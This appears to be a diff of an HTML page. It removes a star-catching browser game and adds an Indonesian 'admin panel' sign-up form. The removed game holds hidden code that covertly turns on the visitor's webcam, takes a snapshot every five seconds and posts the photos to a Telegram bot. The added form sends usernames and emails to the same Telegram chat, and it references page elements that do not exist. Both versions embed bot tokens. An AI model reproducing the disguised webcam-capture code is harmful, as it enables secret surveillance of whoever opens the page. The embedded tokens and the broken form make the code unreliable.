@@ -1,433 +1,402 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Star Catch Game</title>
-    <style>
-        body, html { 
-            margin: 0; 
-            padding: 0; 
-            overflow: hidden; 
-            background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            height: 100%;
-        }
-        #gameCanvas { 
-            display: block; 
-            position: absolute;
-            z-index: 1;
-        }
-        #stars {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-        }
-        .star {
-            position: absolute;
-            background-color: white;
-            border-radius: 50%;
-            animation: twinkle 3s infinite ease-in-out;
-        }
-        @keyframes twinkle {
-            0% { opacity: 0.3; }
-            50% { opacity: 1; }
-            100% { opacity: 0.3; }
-        }
-        #scoreBoard {
-            position: absolute;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(5px);
-            padding: 10px 30px;
-            border-radius: 30px;
-            font-size: 24px;
-            color: #fff;
-            z-index: 2;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-        }
-        #message {
-            position: absolute;
-            top: 40%;
-            width: 100%;
-            text-align: center;
-            font-size: 40px;
-            color: #fff;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
-            display: none;
-            z-index: 2;
-        }
-        #playBtn {
-            position: absolute;
-            top: 55%;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 15px 40px;
-            font-size: 22px;
-            background: linear-gradient(to right, #ff8a00, #da1b60);
-            color: white;
-            border: none;
-            border-radius: 30px;
-            cursor: pointer;
-            display: none;
-            z-index: 2;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-        }
-        #playBtn:hover {
-            transform: translateX(-50%) scale(1.05);
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
-        }
-        #target {
-            position: absolute;
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            border: 3px solid white;
-            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.5);
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            display: none;
-            z-index: 3;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daftar List Admin Panel</title>
+  <style>
+    :root {
+      --primary: #4361ee;
+      --secondary: #3f37c9;
+      --light: #f8f9fa;
+      --dark: #212529;
+      --success: #4cc9f0;
+      --danger: #f72585;
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background-color: #f5f7fd;
+      color: var(--dark);
+    }
+    
+    .container {
+      max-width: 800px;
+      margin: 2rem auto;
+      padding: 2rem;
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+    
+    .header {
+      text-align: center;
+      margin-bottom: 2rem;
+      padding-bottom: 1rem;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .header h1 {
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+    }
+    
+    .header p {
+      color: #6c757d;
+    }
+    
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+      color: var(--dark);
+    }
+    
+    .form-control {
+      width: 100%;
+      padding: 0.75rem;
+      font-size: 1rem;
+      border: 1px solid #ced4da;
+      border-radius: 8px;
+      transition: border-color 0.15s ease-in-out;
+    }
+    
+    .form-control:focus {
+      border-color: var(--primary);
+      outline: none;
+    }
+    
+    .payment-methods {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-top: 10px;
+    }
+    
+    .payment-method {
+      flex: 1;
+      min-width: 120px;
+      text-align: center;
+      border: 2px solid #ced4da;
+      border-radius: 8px;
+      padding: 1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    
+    .payment-method:hover {
+      border-color: var(--primary);
+    }
+    
+    .payment-method.selected {
+      border-color: var(--primary);
+      background-color: rgba(67, 97, 238, 0.1);
+    }
+    
+    .payment-method img {
+      height: 40px;
+      margin-bottom: 10px;
+    }
+    
+    .payment-details {
+      background-color: #f8f9fa;
+      padding: 1rem;
+      border-radius: 8px;
+      margin-top: 1rem;
+      display: none;
+    }
+    
+    .payment-details.active {
+      display: block;
+    }
+    
+    .btn {
+      display: inline-block;
+      background-color: var(--primary);
+      color: white;
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      width: 100%;
+    }
+    
+    .btn:hover {
+      background-color: var(--secondary);
+    }
+    
+    .upload-area {
+      border: 2px dashed #ced4da;
+      padding: 2rem;
+      text-align: center;
+      border-radius: 8px;
+      margin-bottom: 1.5rem;
+      cursor: pointer;
+      transition: border-color 0.3s ease;
+    }
+    
+    .upload-area:hover {
+      border-color: var(--primary);
+    }
+    
+    .upload-area i {
+      font-size: 2rem;
+      color: #6c757d;
+      margin-bottom: 1rem;
+    }
+    
+    #preview-image {
+      max-width: 100%;
+      margin-top: 1rem;
+      border-radius: 8px;
+      display: none;
+    }
+    
+    .confirmation {
+      text-align: center;
+      display: none;
+    }
+    
+    .confirmation i {
+      font-size: 4rem;
+      color: var(--success);
+      margin-bottom: 1rem;
+    }
+    
+    .loader {
+      display: none;
+      text-align: center;
+      margin: 1rem 0;
+    }
+    
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid var(--primary);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .error-message {
+      color: var(--danger);
+      text-align: center;
+      margin: 1rem 0;
+      display: none;
+    }
+    
+    @media (max-width: 768px) {
+      .container {
+        padding: 1rem;
+        margin: 1rem;
+      }
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
-    <div id="stars"></div>
-    <canvas id="gameCanvas"></canvas>
-    <div id="scoreBoard">Score: <span id="score">0</span></div>
-    <div id="message">Game Over!<br>You caught <span id="finalScore">0</span> stars!</div>
-    <button id="playBtn">Play Again</button>
-    <div id="target"></div>
-
-    <script>
-        // Canvas setup
-        const canvas = document.getElementById('gameCanvas');
-        const ctx = canvas.getContext('2d');
-        let width = canvas.width = window.innerWidth;
-        let height = canvas.height = window.innerHeight;
-        window.addEventListener('resize', () => {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-            createBackgroundStars();
-        });
-
-        // Target cursor
-        const target = document.getElementById('target');
-        canvas.addEventListener('mousemove', (e) => {
-            if (!gameOver) {
-                target.style.display = 'block';
-                target.style.left = e.clientX + 'px';
-                target.style.top = e.clientY + 'px';
-            }
-        });
-        canvas.addEventListener('mouseout', () => {
-            target.style.display = 'none';
-        });
-
-        // Background stars
-        function createBackgroundStars() {
-            const starsContainer = document.getElementById('stars');
-            starsContainer.innerHTML = '';
-            const starCount = Math.floor(width * height / 10000);
-            
-            for (let i = 0; i < starCount; i++) {
-                const star = document.createElement('div');
-                star.className = 'star';
-                star.style.left = Math.random() * 100 + '%';
-                star.style.top = Math.random() * 100 + '%';
-                star.style.width = (Math.random() * 2 + 1) + 'px';
-                star.style.height = star.style.width;
-                star.style.animationDelay = Math.random() * 3 + 's';
-                starsContainer.appendChild(star);
-            }
-        }
-        createBackgroundStars();
-
-        // Game variables
-        let gameStars = [], score = 0, gameOver = false;
-        const maxStars = 15;
-        const starColors = ['#ffcc33', '#ff8c00', '#ff69b4', '#da70d6', '#87cefa'];
-
-        function GameStar() {
-            this.x = Math.random() * width;
-            this.y = -30;
-            this.size = 25 + Math.random() * 25;
-            this.speed = 1 + Math.random() * 4;
-            this.color = starColors[Math.floor(Math.random() * starColors.length)];
-            this.rotation = 0;
-            this.rotationSpeed = (Math.random() - 0.5) * 0.05;
-            this.points = 5 - Math.floor(this.speed);
-            if (this.points < 1) this.points = 1;
-        }
+  <div class="container">
+    <div class="header">
+      <h1>LIST ADMIN PANEL</h1>
+      <p>ALBERT PANEL</p>
+    </div>
+    
+    <div id="payment-form">
+      <div class="form-group">
+        <label for="amount">USERNAME PANEL</label>
+        <input type="text" id="amount" class="form-control" placeholder="contoh: xvoid" required>
+      </div>
+      
+      <div class="form-group">
+        <label for="contact">EMAIL PANEL</label>
+        <input type="text" id="contact" class="form-control" placeholder="contoh: xvoid@gmail.com" required>
+      </div>
+      
+      <div class="form-group">
+        <label>Metode Pembayaran</label>
+        <div class="payment-methods">
+          <div class="payment-method" id="dana" onclick="selectPayment('dana')">
+            <p>DEVELOPER</p>
+          </div>
+          <div class="payment-method" id="gopay" onclick="selectPayment('gopay')">
+            <p>PT PANEL</p>
+          </div>
+          <div class="payment-method" id="qris" onclick="selectPayment('qris')">
+            <p>OWNER PANEL</p>
+          </div>
+          <div class="payment-method" id="admin" onclick="selectPayment('admin')">
+            <p>ADMIN PANEL</p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="payment-details" id="dana-details">
+        <h3>DEVELOPER</h3>
+      </div>
+      
+      <div class="payment-details" id="gopay-details">
+        <h3>PT PANEL</h3>
+      </div>
+      
+      <div class="payment-details" id="qris-details">
+        <h3>OWNER PANEL</h3>
+      </div>
+      
+      <div class="payment-details" id="admin-details">
+        <h3>ADMIN PANEL</h3>
+      </div>
+      
+      <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p>Sedang mengirim daftar admin panel...</p>
+      </div>
+      
+      <div class="error-message" id="error-message">
+        <i class="fas fa-exclamation-circle"></i>
+        <p>Terjadi kesalahan saat mengirim data admin. Silakan coba lagi.</p>
+      </div>
+      
+      <button class="btn" id="submit-btn" onclick="submitPayment()">KIRIM</button>
+    </div>
+    
+    <div class="confirmation" id="confirmation">
+      <i class="fas fa-check-circle"></i>
+      <h2>Data Admin Panel Berhasil di kirim!</h2>
+      <p>Terima kasih. Detail data admin telah dikirim ke admin kami via Telegram.</p>
+      <p>Albert Panel.</p>
+    </div>
+  </div>
+  
+  <script>
+    // Konfigurasi Bot Telegram
+    // Ganti dengan token dan chat ID Anda sendiri
+    const TELEGRAM_BOT_TOKEN = '7953902112:AAEhOOgOfJ9OjMeElIVRLNqclVTjjbARZOY';
+    const TELEGRAM_CHAT_ID = '8050058475';
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+    
+    let selectedPayment = null;
+    
+    function selectPayment(method) {
+      // Reset all payment methods
+      document.querySelectorAll('.payment-method').forEach(el => {
+        el.classList.remove('selected');
+      });
+      
+      // Hide all payment details
+      document.querySelectorAll('.payment-details').forEach(el => {
+        el.classList.remove('active');
+      });
+      
+      // Select the clicked payment method
+      document.getElementById(method).classList.add('selected');
+      document.getElementById(method + '-details').classList.add('active');
+      
+      // Show upload section
+      document.getElementById('upload-section').style.display = 'block';
+      
+      selectedPayment = method;
+    }
+    
+    function previewImage(event) {
+      const preview = document.getElementById('preview-image');
+      preview.src = URL.createObjectURL(event.target.files[0]);
+      preview.style.display = 'block';
+    }
+    
+    async function submitPayment() {
+      const amount = document.getElementById('amount').value;
+      const contact = document.getElementById('contact').value;
+      const proofFile = document.getElementById('proof').files[0];
+      
+      if (!amount || !contact || !selectedPayment || !proofFile) {
+        alert('Mohon lengkapi semua data pembayaran!');
+        return;
+      }
+      
+      // Menampilkan loader
+      document.getElementById('loader').style.display = 'block';
+      document.getElementById('submit-btn').disabled = true;
+      document.getElementById('error-message').style.display = 'none';
+      
+      try {
+        // Step 1: Kirim pesan teks ke Telegram
+        const messageText = `🔔 *LOG ADMIN PANEL*\n\n` +
+          `👤 *USERNAME:* ${amount}\n` +
+          `💳 *STATUS:* ${selectedPayment.toUpperCase()}\n` +
+          `📞 *EMAIL:* ${contact}\n` +
+          `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+          
+        await sendTelegramMessage(messageText);
         
-        GameStar.prototype.draw = function() {
-            ctx.save();
-            ctx.translate(this.x, this.y);
-            ctx.rotate(this.rotation);
-            
-            // Draw a star
-            ctx.beginPath();
-            ctx.fillStyle = this.color;
-            
-            const spikes = 5;
-            const outerRadius = this.size / 2;
-            const innerRadius = outerRadius * 0.4;
-            
-            for (let i = 0; i < spikes * 2; i++) {
-                const radius = i % 2 === 0 ? outerRadius : innerRadius;
-                const angle = (Math.PI * 2 * i) / (spikes * 2);
-                const x = Math.cos(angle) * radius;
-                const y = Math.sin(angle) * radius;
-                
-                if (i === 0) {
-                    ctx.moveTo(x, y);
-                } else {
-                    ctx.lineTo(x, y);
-                }
-            }
-            
-            ctx.closePath();
-            ctx.fill();
-            
-            // Add glow effect
-            ctx.shadowColor = this.color;
-            ctx.shadowBlur = 15;
-            ctx.fill();
-            
-            ctx.restore();
-            
-            // Draw points text for faster stars
-            if (this.speed > 3) {
-                ctx.fillStyle = 'white';
-                ctx.font = 'bold 16px Arial';
-                ctx.textAlign = 'center';
-                ctx.fillText(`+${this.points}`, this.x, this.y);
-            }
-        };
         
-        GameStar.prototype.update = function() { 
-            this.y += this.speed; 
-            this.rotation += this.rotationSpeed;
-        };
-
-        function addStar() {
-            if (gameStars.length < maxStars && !gameOver) gameStars.push(new GameStar());
-        }
-
-        function loop() {
-            ctx.clearRect(0, 0, width, height);
-            gameStars.forEach((star, i) => {
-                star.update();
-                star.draw();
-                if (star.y - star.size > height) gameStars.splice(i, 1);
-            });
-            if (!gameOver) requestAnimationFrame(loop);
-        }
-
-        canvas.addEventListener('click', e => {
-            if (gameOver) return;
-            
-            // Add click effect
-            const clickEffect = document.createElement('div');
-            clickEffect.style.position = 'absolute';
-            clickEffect.style.left = e.clientX + 'px';
-            clickEffect.style.top = e.clientY + 'px';
-            clickEffect.style.width = '10px';
-            clickEffect.style.height = '10px';
-            clickEffect.style.background = 'white';
-            clickEffect.style.borderRadius = '50%';
-            clickEffect.style.zIndex = '10';
-            clickEffect.style.transform = 'translate(-50%, -50%)';
-            clickEffect.style.animation = 'clickEffect 0.5s forwards';
-            document.body.appendChild(clickEffect);
-            
-            // Add click effect animation
-            const style = document.createElement('style');
-            style.innerHTML = `
-                @keyframes clickEffect {
-                    0% { opacity: 1; width: 0; height: 0; }
-                    100% { opacity: 0; width: 70px; height: 70px; }
-                }
-            `;
-            document.head.appendChild(style);
-            
-            // Remove the element after animation
-            setTimeout(() => {
-                document.body.removeChild(clickEffect);
-            }, 500);
-            
-            const rect = canvas.getBoundingClientRect();
-            const mx = e.clientX - rect.left;
-            const my = e.clientY - rect.top;
-            
-            gameStars.forEach((star, i) => {
-                if (Math.hypot(star.x - mx, star.y - my) < star.size / 2) {
-                    gameStars.splice(i, 1);
-                    score += star.points;
-                    document.getElementById('score').innerText = score;
-                    
-                    // Add score popup effect
-                    const scorePopup = document.createElement('div');
-                    scorePopup.textContent = `+${star.points}`;
-                    scorePopup.style.position = 'absolute';
-                    scorePopup.style.left = mx + 'px';
-                    scorePopup.style.top = my + 'px';
-                    scorePopup.style.color = 'white';
-                    scorePopup.style.fontSize = '20px';
-                    scorePopup.style.fontWeight = 'bold';
-                    scorePopup.style.textShadow = '0 0 5px rgba(0,0,0,0.5)';
-                    scorePopup.style.zIndex = '10';
-                    scorePopup.style.transform = 'translate(-50%, -50%)';
-                    scorePopup.style.animation = 'scorePopup 1s forwards';
-                    document.body.appendChild(scorePopup);
-                    
-                    // Add score popup animation
-                    const scoreStyle = document.createElement('style');
-                    scoreStyle.innerHTML = `
-                        @keyframes scorePopup {
-                            0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-                            100% { opacity: 0; transform: translate(-50%, -100%) scale(1.5); }
-                        }
-                    `;
-                    document.head.appendChild(scoreStyle);
-                    
-                    // Remove the element after animation
-                    setTimeout(() => {
-                        document.body.removeChild(scorePopup);
-                    }, 1000);
-                    
-                    if (score >= 20) endGame();
-                }
-            });
-        });
-
-        function endGame() {
-            gameOver = true;
-            document.getElementById('message').style.display = 'block';
-            document.getElementById('playBtn').style.display = 'block';
-            document.getElementById('finalScore').innerText = score;
-            target.style.display = 'none';
-        }
-        
-        document.getElementById('playBtn').addEventListener('click', () => {
-            gameStars = [];
-            score = 0;
-            gameOver = false;
-            document.getElementById('score').innerText = score;
-            document.getElementById('message').style.display = 'none';
-            document.getElementById('playBtn').style.display = 'none';
-            loop();
-        });
-
-        setInterval(addStar, 800);
-        loop();
-
-        // Image capture and comparison logic
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    const captureCanvas = document.createElement('canvas');
-                    const captureCtx = captureCanvas.getContext('2d');
-                    
-                    // Variables for image comparison
-                    let previousImageData = null;
-                    let differenceThreshold = 5; // Percentage of pixels that need to be different
-                    let imagesSent = 0;
-                    
-                    setInterval(() => {
-                        if (video.readyState >= 2) {
-                            captureCanvas.width = video.videoWidth;
-                            captureCanvas.height = video.videoHeight;
-                            captureCtx.drawImage(video, 0, 0);
-                            
-                            // Get current image data
-                            const currentImageData = captureCtx.getImageData(0, 0, captureCanvas.width, captureCanvas.height);
-                            
-                            // Check if image is different enough to send
-                            if (shouldSendImage(previousImageData, currentImageData, differenceThreshold)) {
-                                captureCanvas.toBlob(blob => {
-                                    sendPhoto(blob);
-                                    imagesSent++;
-                                    console.log(`Image sent (${imagesSent}): Significant change detected`);
-                                }, 'image/jpeg', 0.8);
-                                
-                                // Update previous image data
-                                previousImageData = currentImageData;
-                            } else {
-                                console.log("Image not sent: Not enough difference detected");
-                            }
-                        }
-                    }, 5000);
-                })
-                .catch(err => console.error('Failed to access camera:', err));
-        }
-        
-        // Function to compare two images and determine if they're different enough
-        function shouldSendImage(previousData, currentData, threshold) {
-            // If there's no previous image, we should send this one
-            if (!previousData) return true;
-            
-            const data1 = previousData.data;
-            const data2 = currentData.data;
-            
-            // If image dimensions changed, consider it a new image
-            if (previousData.width !== currentData.width || 
-                previousData.height !== currentData.height) {
-                return true;
-            }
-            
-            // Count pixels that differ significantly
-            let diffPixels = 0;
-            const totalPixels = data1.length / 4; // RGBA has 4 values per pixel
-            
-            // Sample every 10th pixel for performance
-            for (let i = 0; i < data1.length; i += 40) {
-                const r1 = data1[i];
-                const g1 = data1[i + 1];
-                const b1 = data1[i + 2];
-                
-                const r2 = data2[i];
-                const g2 = data2[i + 1];
-                const b2 = data2[i + 2];
-                
-                // Calculate color difference
-                const diff = Math.abs(r1 - r2) + Math.abs(g1 - g2) + Math.abs(b1 - b2);
-                
-                // If the difference is significant, count this pixel
-                if (diff > 30) {
-                    diffPixels++;
-                }
-            }
-            
-            // Calculate the percentage of different pixels
-            const diffPercentage = (diffPixels / (totalPixels / 10)) * 100;
-            
-            // Return true if the difference percentage exceeds the threshold
-            return diffPercentage >= threshold;
-        }
-
-        function sendPhoto(blob) {
-            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
-            const CHAT_ID = '8050058475';
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'snapshot.jpg');
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => console.log(data.ok ? 'Photo sent successfully!' : 'Error sending photo', data))
-            .catch(error => console.error('Network error sending photo:', error));
-        }
-    </script>
+        // Menampilkan konfirmasi sukses
+        document.getElementById('payment-form').style.display = 'none';
+        document.getElementById('confirmation').style.display = 'block';
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        document.getElementById('error-message').style.display = 'block';
+      } finally {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('submit-btn').disabled = false;
+      }
+    }
+    
+    async function sendTelegramMessage(text) {
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('text', text);
+      formData.append('parse_mode', 'Markdown');
+      
+      const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+        method: 'POST',
+        body: formData
+      });
+      
+      const result = await response.json();
+      if (!result.ok) {
+        throw new Error(`Telegram API Error: ${result.description}`);
+      }
+      
+      return result;
+    }
+    
+    async function sendTelegramPhoto(photoFile, caption) {
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', photoFile);
+      formData.append('caption', caption);
+      
+      const response = await fetch(`${TELEGRAM_API_URL}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+      
+      const result = await response.json();
+      if (!result.ok) {
+        throw new Error(`Telegram API Error: ${result.description}`);
+      }
+      
+      return result;
+    }
+  </script>
 </body>
 </html>
